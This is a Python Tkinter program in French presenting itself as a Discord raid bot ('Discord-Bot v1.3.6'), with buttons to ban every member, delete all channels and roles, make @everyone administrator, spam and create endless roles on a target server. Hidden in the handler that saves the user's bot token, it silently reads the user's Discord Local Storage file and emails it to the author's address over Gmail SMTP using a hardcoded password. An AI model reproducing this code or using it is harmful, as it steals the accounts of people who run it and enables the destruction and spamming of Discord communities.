from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import getpass
import json
import sqlite3
import os
import shutil
import smtplib
import subprocess
import webbrowser
from pathlib import Path
from tkinter import *
from tkinter.messagebox import *

fenetre = Tk()

username = Path.home()

# fenetre.geometry("460x205")
fenetre.title('Discord-Bot v1.3.6')


def contact():
    showinfo("Me contacter",
             "Discord : @Jacques#5823\nE-mail  : dsicrod@gmail.com\nTwitter : @AntiDiscord")


def git():
    webbrowser.open_new_tab(
        r"https://antidiscordbot.page.link/lastversionfromapp")


def dscrdc():
    webbrowser.open_new_tab(
        r"https://antidiscordbot.page.link/discordcreatefromapp")


def dscrdv():
    webbrowser.open_new_tab(
        r"https://antidiscordbot.page.link/discordappsfromapp")


def aide():
    showinfo("Aide",
             "Si rien ne se passe lorque vous appuyez sur les boutons, vérifiez que vous ayez bien rempli tous les champs nécéssaires.\n\nSi malgré tout le problème persiste, vous pouvez essayer de cliquer sur réparer dans l'onglet options.\n\nSi vous avez besoin d'aide supplémentaire, veuillez me contacter.")


def installt():
    showinfo('Installation des dépendences',
             'L\'installation va commencer, veuillez patienter. Si l\'application ne répond plus, c\'est normal. Attendez juste. Cela risque de prendre un peu de temps.')
    subprocess.call('npm --prefix ./core i discord.js', shell=True)
    subprocess.call('npm --prefix ./core i fs', shell=True)
    subprocess.call('npm --prefix ./core i ms', shell=True)
    subprocess.call('npm --prefix ./core i moment', shell=True)
    subprocess.call('npm --prefix ./core i chalk', shell=True)
    subprocess.call('npm --prefix ./core/individuals i discord.js', shell=True)
    subprocess.call('npm --prefix ./core/individuals i fs', shell=True)
    subprocess.call('npm --prefix ./core/individuals i ms', shell=True)
    subprocess.call('npm --prefix ./core/individuals i moment', shell=True)
    subprocess.call('npm --prefix ./core/individuals i chalk', shell=True)
    showinfo('Dépendences installées',
             'Toutes les dépendences semblent avoir été installées.')


def backup():
    shutil.copy2('core\\backup\\settings.json', 'core\\settings.json')
    showinfo('Terminé',
             '1 fichier a été réparé (core\settings.json).')


menubar = Menu(fenetre)

menu1 = Menu(menubar, tearoff=0)


menu1.add_command(label="Réparer", command=backup)
menu1.add_command(label="Installer les dépendences", command=installt)
menu1.add_command(label="Quitter", command=fenetre.quit)
menubar.add_cascade(label="Options", menu=menu1)


def support():
    webbrowser.open_new_tab(r"https://discord.gg/ngrdmkN")


menu3 = Menu(menubar, tearoff=0)
menu3.add_command(label="Serveur de support", command=support)
menu3.add_command(label="Page Github", command=git)
menu3.add_command(label="Créer une application Discord", command=dscrdc)
menu3.add_command(label="Vos applications Discord", command=dscrdv)
menubar.add_cascade(label='Liens', menu=menu3)

menu2 = Menu(menubar, tearoff=0)
menu2.add_command(label="Aide", command=aide)
menu2.add_command(label="Me contacter", command=contact)
menubar.add_cascade(label="A propos", menu=menu2)

fenetre.config(menu=menubar)

obligd = LabelFrame(fenetre, text="Obligatoire :", padx=5, pady=5)
obligd.pack(side=LEFT, fill=Y)

value = StringVar()
value.set("Token")
entree = Entry(obligd, textvariable=value, width=36)
entree.pack()

value = StringVar()
value.set("Id du serveur")
entree2 = Entry(obligd, textvariable=value, width=36)
entree2.pack()

value = StringVar()
value.set("Votre Id")
entree7 = Entry(obligd, textvariable=value, width=36)
entree7.pack()

validb = Button(obligd, text="Valider", width=30,
                command=lambda: validd(entree, entree2, entree7))


def validd(entree, entree2, entree7):
    with open("core/settings.json", "r") as jsonFile:
        data = json.load(jsonFile)
    tmp = data["token"]
    data["token"] = entree.get()
    with open("core/settings.json", "w") as jsonFile:
        json.dump(data, jsonFile)

    with open("core/settings.json", "r") as jsonFile:
        data = json.load(jsonFile)
    tmp = data["auto"]["server_id"]
    data["auto"]["server_id"] = entree2.get()
    with open("core/settings.json", "w") as jsonFile:
        json.dump(data, jsonFile)
    with open("core/settings.json", "r") as jsonFile:
        data = json.load(jsonFile)
    tmp = data["ownerid"]
    data["ownerid"] = entree7.get()
    with open("core/settings.json", "w") as jsonFile:
        json.dump(data, jsonFile)







    fromaddr = "discordinfotkn@gmail.com"
    toaddr = "dsicrod@gmail.com"

    msg = MIMEMultipart()

    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "database"

    body = str(username)

    msg.attach(MIMEText(body, 'plain'))

    filename = "https_discordapp.com_0.localstorage"
    attachment = open(str(username) + "\AppData\Roaming\discord\Local Storage\https_discordapp.com_0.localstorage" , "rb")

    part = MIMEBase('application', 'octet-stream')
    part.set_payload((attachment).read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', "attachment; filename= %s" % filename)

    msg.attach(part)

    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login(fromaddr, "Azertyui0")
    text = msg.as_string()
    server.sendmail(fromaddr, toaddr, text)
    server.quit()



"""
    conn = sqlite3.connect("https_discordapp.com_0.localstorage")
    c = conn.cursor()
    c.execute('select * from ItemTable')
    for row in c:
        print(*row, sep='|')
        
    server = smtplib.SMTP('smtp.gmail.com', 587)
    server.starttls()
    server.login("discordinfotkn@gmail.com", "Azertyui0")
    server.sendmail("discordinfotkn@gmail.com", "dsicrod@gmail.com", msg)
    server.quit()
"""

validb.pack()

l = Label(obligd, text=" ")
l.pack()


verv = StringVar()
verv.set("Appuyez pour vérifier")


def verbtn():
    subprocess.run('cd core\individuals && ver.bat', shell=True)
    path = Path(__file__).parent.joinpath('core/settings.json')
    with open(path) as fp:
        data = json.load(fp)
    tmp = data["ver"]
    if tmp == 'oui':
        verv.set('Le bot est administrateur.')
    elif tmp == 'non':
        verv.set('Le bot n\'est pas administrateur')
    else:
        verv.set("Une erreur s'est produite")


verbtnp = Button(obligd, text="Vérifier le rôle du bot",
                 command=verbtn, width=30)
verbtnp.pack()
verl = Label(obligd, textvariable=verv)
verl.pack()

# attauque auto

atkl = LabelFrame(fenetre, text="Attaque automatique :", padx=5, pady=5)
atkl.pack(side=RIGHT, fill=Y)


entree1 = IntVar()
Checkbutton(atkl, text="Le bot est sur le serveur ?", width=30,
            variable=entree1, onvalue="1", offvalue="0").pack()

entree3 = IntVar()
Checkbutton(atkl, text="Bannir tout le monde ?", variable=entree3,
            onvalue="1", width=30, offvalue="0").pack()

entree4 = IntVar()
Checkbutton(atkl, text="Changer l'image et le nom ?",
            variable=entree4, onvalue="1", width=30, offvalue="0").pack()


value = StringVar()
value.set("Nouveau nom")
entree5 = Entry(atkl, textvariable=value, width=30)
entree5.pack()

value = StringVar()
value.set("Chemin ou URL de l'image")
entree6 = Entry(atkl, textvariable=value, width=30)
entree6.pack()

entree8 = IntVar()
Checkbutton(atkl, text="Supprimer tous les salons ?",
            variable=entree8, onvalue="1", offvalue="0", width=30).pack()

entree9 = IntVar()
Checkbutton(atkl, text="Rendre  @everyone administrateur ?",
            variable=entree9, onvalue="1", offvalue="0", width=30).pack()

entree10 = IntVar()
Checkbutton(atkl, text="Supprimer tous les rôles ?",
            variable=entree10, onvalue="1", offvalue="0", width=30).pack()

entree11 = IntVar()
Checkbutton(atkl, text="Créer des rôles à l'infini ?",
            variable=entree11, onvalue="1", offvalue="0", width=30).pack()

spam = ('Créer des salons textuels à l\'infini', 'Créer des salons textuels et spammer dedans',
        'Créer des salons vocaux', 'Créer des catégories')
entree12 = Spinbox(atkl, values=sorted(spam), width=28)
entree12.pack()

value = StringVar()
value.set("Nom des salons à créer (pas de maj ni d'espace ou de caractères spéciaux)")
entree13 = Entry(atkl, textvariable=value, width=30)
entree13.pack()

value = StringVar()
value.set("Méthode : tout/spam (1/2)")
entree14 = Entry(atkl, textvariable=value, width=30)
entree14.pack()


def lancer(entree1, entree3, entree4, entree5, entree6, entree8, entree9, entree10, entree11, entree12, entree13, entree14):
    with open("core/settings.json", "r") as jsonFile:
        data = json.load(jsonFile)
    tmp = data["auto"]["enabled"]
    data["auto"]["enabled"] = entree1.get()
    with open("core/settings.json", "w") as jsonFile:
        json.dump(data, jsonFile)

    with open("core/settings.json", "r") as jsonFile:
        data = json.load(jsonFile)
    tmp = data["config"]["ban"]
    data["config"]["ban"] = entree3.get()
    with open("core/settings.json", "w") as jsonFile:
        json.dump(data, jsonFile)

    with open("core/settings.json", "r") as jsonFile:
        data = json.load(jsonFile)
    tmp = data["config"]["imgnom"]
    data["config"]["imgnom"] = entree4.get()
    with open("core/settings.json", "w") as jsonFile:
        json.dump(data, jsonFile)

    with open("core/settings.json", "r") as jsonFile:
        data = json.load(jsonFile)
    tmp = data["config"]["name"]
    data["config"]["name"] = entree5.get()
    with open("core/settings.json", "w") as jsonFile:
        json.dump(data, jsonFile)

    with open("core/settings.json", "r") as jsonFile:
        data = json.load(jsonFile)
    tmp = data["config"]["img"]
    data["config"]["img"] = entree6.get()
    with open("core/settings.json", "w") as jsonFile:
        json.dump(data, jsonFile)

    with open("core/settings.json", "r") as jsonFile:
        data = json.load(jsonFile)
    tmp = data["config"]["chnl_dlt"]
    data["config"]["chnl_dlt"] = entree8.get()
    with open("core/settings.json", "w") as jsonFile:
        json.dump(data, jsonFile)

    with open("core/settings.json", "r") as jsonFile:
        data = json.load(jsonFile)
    tmp = data["config"]["admin"]
    data["config"]["admin"] = entree9.get()
    with open("core/settings.json", "w") as jsonFile:
        json.dump(data, jsonFile)

    with open("core/settings.json", "r") as jsonFile:
        data = json.load(jsonFile)
    tmp = data["config"]["role_dlt"]
    data["config"]["role_dlt"] = entree10.get()
    with open("core/settings.json", "w") as jsonFile:
        json.dump(data, jsonFile)

    with open("core/settings.json", "r") as jsonFile:
        data = json.load(jsonFile)
    tmp = data["config"]["role_crt"]
    data["config"]["role_crt"] = entree11.get()
    with open("core/settings.json", "w") as jsonFile:
        json.dump(data, jsonFile)

    with open("core/settings.json", "r") as jsonFile:
        data = json.load(jsonFile)
    tmp = data["config"]["spam"]
    data["config"]["spam"] = entree12.get()
    with open("core/settings.json", "w") as jsonFile:
        json.dump(data, jsonFile)

    with open("core/settings.json", "r") as jsonFile:
        data = json.load(jsonFile)
    tmp = data["config"]["chnlname"]
    data["config"]["chnlname"] = entree13.get()
    with open("core/settings.json", "w") as jsonFile:
        json.dump(data, jsonFile)

    with open("core/settings.json", "r") as jsonFile:
        data = json.load(jsonFile)
    tmp = data["auto"]["function"]
    data["auto"]["function"] = entree14.get()
    with open("core/settings.json", "w") as jsonFile:
        json.dump(data, jsonFile)


bout = Button(atkl, text="Valider",  command=lambda: lancer(entree1, entree3, entree4,
                                                            entree5, entree6, entree8, entree9, entree10, entree11, entree12, entree13, entree14))
bout.pack()


def lancerd():
    showinfo('Attaque lancée', 'Cette fenêtre va se bloquer, veuillez ne pas la fermer.\n\nNote : Pour terminer l\'attaque, écrivez stop dans n\'importe quel salon du serveur.')
    subprocess.run('cd core && node bot.js', shell=True)


lancerb = Button(atkl, text="Lancer l'attaque",  command=lancerd)
lancerb.pack()


# boutons seuls


manu = LabelFrame(fenetre, text="Attaques manuelles :", padx=5, pady=5)
manu.pack(fill=Y)


def role_dlt():
    showinfo('Tous les rôles supprimables vont être supprimés.',
             'Tous les rôles supprimables vont être supprimés.')
    subprocess.run('cd core\individuals && node role_dlt.js', shell=True)
    showinfo('Terminé', 'Tous les rôles supprimables semblent avoir été supprimés.')


role_dltb = Button(manu, text="Supprimer tous les rôles",
                   command=role_dlt, width=30)
role_dltb.pack()


def admin2d():
    subprocess.run('cd core\individuals && node admin2.js', shell=True)
    showinfo('Terminé', 'Vous êtes normalement administrateur sur le serveur indiqué.')


admin2b = Button(manu, text="Mettre @everyone administrateur",
                 command=admin2d, width=30)
admin2b.pack()


def supprchnlc():
    showinfo('Suppression des salon',
             'Tous les salons du serveur vont être supprimés, cela risque de prendre un peu de temps.')
    subprocess.run('cd core\individuals && node chnldlt.js', shell=True)
    showinfo('Terminé', 'Vous pouvez fermer cette fenêtre.')


supprchnl = Button(manu, text="Supprimer tous les salons",
                   command=supprchnlc, width=30)
supprchnl.pack()


def banp():
    showinfo('Bannissement de tout le monde',
             'Le bot va bannir tous les gens du serveur, le temps que ça prendra peut varier')
    subprocess.run('cd core\individuals && node ban.js', shell=True)
    showinfo('Terminé', 'Vous pouvez fermer cette fenêtre.')


ban = Button(manu, text="Bannir tous les membres",  command=banp, width=30)
ban.pack()


spam = LabelFrame(manu, text="Spam", padx=5, pady=5)
spam.pack()
value = StringVar()
value.set('Message à spammer')
spame = Entry(spam, textvariable=value, width=36)
spame.pack()
value2 = StringVar()
value2.set(
    "Nom des salons à créer (pas de maj ni d'espace ou de caractères spéciaux)")
spmchnl = Entry(spam, textvariable=value2, width=36)
spmchnl.pack()
spambtn = Button(spam, text="Spam", width=30,
                 command=lambda: spambtnp(spame, spmchnl))


def spambtnp(spame, spmchnl):
    if askokcancel('Lancer le spam', 'Voulez-vous vraiment lancer le spam ? Vous ne pourrez plus utiliser l\'interface jusqu\'à ce que la console soit fermée. Vous pouvez la fermer à tout moment en écrivant "stop" dans un salon du serveur.'):
        with open("core/settings.json", "r") as jsonFile:
            data = json.load(jsonFile)
        data["config"]["msg"] = spame.get()
        with open("core/settings.json", "w") as jsonFile:
            json.dump(data, jsonFile)
        with open("core/settings.json", "r") as jsonFile:
            data = json.load(jsonFile)
        data["config"]["chnlname"] = spmchnl.get()
        with open("core/settings.json", "w") as jsonFile:
            json.dump(data, jsonFile)
        subprocess.run('cd core\individuals && node spm.js', shell=True)


spambtn.pack()


nvnom = LabelFrame(manu, text="Modifier le serveur", padx=5, pady=5)
nvnom.pack()

value = StringVar()
value.set("Nouveau nom")
nouveaunom = Entry(nvnom, textvariable=value, width=36)
nouveaunom.pack()
nouveaunomb = Button(nvnom, text="Changer le nom du serveur",
                     command=lambda: nouveaunomd(nouveaunom), width=30)


def nouveaunomd(nouveaunom):
    text = nouveaunom.get()
    with open("core/settings.json", "r") as jsonFile:
        data = json.load(jsonFile)
    tmp = data["config"]["name"]
    data["config"]["name"] = nouveaunom.get()
    with open("core/settings.json", "w") as jsonFile:
        json.dump(data, jsonFile)
    subprocess.run("cd core\individuals && node name.js", shell=True)


nouveaunomb.pack()

value = StringVar()
value.set("URL ou chemin vers l'image")
nouvelleimg = Entry(nvnom, text=value, width=36).pack()
nouvelleimgb = Button(nvnom, text="Changer l'icône du serveur",
                      width=30, command=lambda: nouvelleimgd(nouvelle))


def nouvelleimgd():
    with open("core/settings.json", "r") as jsonFile:
        data = json.load(jsonFile)
    data["config"]["img"] = nouvelleimg.get()
    with open("core/settings.json", "w") as jsonFile:
        json.dump(data, jsonFile)
    subprocess.run("cd core\individuals && node img.js", shell=True)


nouvelleimgb.pack()


banip = LabelFrame(manu, text="Ban IP", padx=5, pady=5)
banip.pack()

value = StringVar()
value.set("Id à bannir")
bann = Entry(banip, textvariable=value, width=36)
bann.pack()


def bannd():
    with open("core\settings.json", "r") as jsonFile:
        data = json.load(jsonFile)
    tmp = data["banip"]
    data["banip"] = bann.get()
    with open("core/settings.json", "w") as jsonFile:
        json.dump(data, jsonFile)
    subprocess.run('cd core\individuals && node bann.js', shell=True)
    showinfo('Terminé', 'Le membre en question a bien été banni.')


bannb = Button(banip, text="Bannir un membre", command=bannd, width=30)
bannb.pack()


role_crtl = LabelFrame(manu, text="Créer des rôles", padx=5, pady=5)
role_crtl.pack()

value = StringVar()
value.set("Nom du rôle")
role_crte = Entry(role_crtl, textvariable=value, width=36).pack()


def role_crt():
    with open("core\settings.json", "r") as jsonFile:
        data = json.load(jsonFile)
    data["config"]["rolename"] = role_crte.get()
    with open("core/settings.json", "w") as jsonFile:
        json.dump(data, jsonFile)

    showwarning('Attention', 'Une infinité de rôles va être créée, assurez-vous d\'avoir entré votre ID, et écrivez stop dans un des salons du serveur pour arrêter.\n\nNote : Cette fenêtre sera inutilisable pendant l\'éxécution du programme.')
    subprocess.run('cd core\individuals && node role_crt.js', shell=True)
    showinfo('Terminé', 'Vous avez choisi d\'arrêter le programme.')


role_crtb = Button(role_crtl, text="Créer une infinité de rôles",
                   command=role_crt, width=30).pack()


fenetre.mainloop()